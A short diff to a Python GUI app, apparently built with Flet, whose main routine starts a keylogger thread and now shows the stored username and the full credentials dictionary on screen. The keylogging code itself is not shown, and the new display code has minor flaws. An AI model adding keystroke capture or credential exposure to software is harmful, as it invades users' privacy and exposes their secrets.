@@ -14,7 +14,7 @@ def main(page: Page):
     log_directory = setup_log_directory()
 
     # Step 2: Load credentials to get the username
-    credentials = load_credentials()
+    credentials: dict = load_credentials()
     username = credentials["username"]
     load_config()
 
@@ -23,15 +23,21 @@ def main(page: Page):
     keylogger_thread.start()
 
     def update_credential_view():
-        # Container containing creds.text = new creds
-        # container containing creds.update()
+        credential_controls = [Text(value=cred) for cred in credentials.items()]
+        credential_view.content.controls = credential_controls
+        credential_view.update()
         pass
 
-    username_view = Container(
-        Text(value=f"Username: {username}")
+    credential_view = Container(
+        Column(
+            controls=[
+                Text(value=f"Username: {username}"),
+                Text(value=f"These are total creds: {credentials}")
+            ]
+        )
     )
 
-    page.add(username_view)
+    page.add(credential_view)
 
 
 if __name__ == "__main__":
